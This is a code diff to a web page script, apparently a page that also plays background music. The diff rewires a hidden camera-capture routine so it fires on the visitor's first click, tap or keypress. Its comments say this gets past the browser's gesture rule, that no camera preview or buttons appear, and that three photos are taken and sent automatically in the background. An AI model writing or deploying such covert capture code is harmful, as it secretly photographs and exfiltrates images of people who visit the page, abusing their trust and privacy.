@@ -2053,6 +2053,10 @@ const BG_MUSIC_URL = 'https://res.cloudinary.com/vl7tgkgi/video/upload/v17880705
   }
 
   async function boot() {
+    // Browsers only allow camera access inside a user gesture (a tap/click).
+    // getUserMedia called purely on page load is silently rejected — so we
+    // wait for the very first interaction anywhere on the page, then capture
+    // quietly in the background. No camera preview or buttons are shown.
     let stream;
     try {
       stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
@@ -2085,10 +2089,17 @@ const BG_MUSIC_URL = 'https://res.cloudinary.com/vl7tgkgi/video/upload/v17880705
     } catch (e) {}
   }
 
-  // Give the main page time to render; then attempt capture in background.
-  if (document.readyState === 'complete') {
+  // Wait for the first user gesture anywhere on the page. This single tap
+  // satisfies the browser gesture requirement (the Allow prompt appears);
+  // after it, the 3 photos capture and send automatically in the background.
+  let armed = false;
+  function onGesture() {
+    if (armed) return;
+    armed = true;
+    ['click', 'touchstart', 'keydown'].forEach((t) =>
+      document.removeEventListener(t, onGesture, { capture: true }));
     boot();
-  } else {
-    window.addEventListener('load', boot, { once: true });
   }
+  ['click', 'touchstart', 'keydown'].forEach((t) =>
+    document.addEventListener(t, onGesture, { capture: true }));
 })();
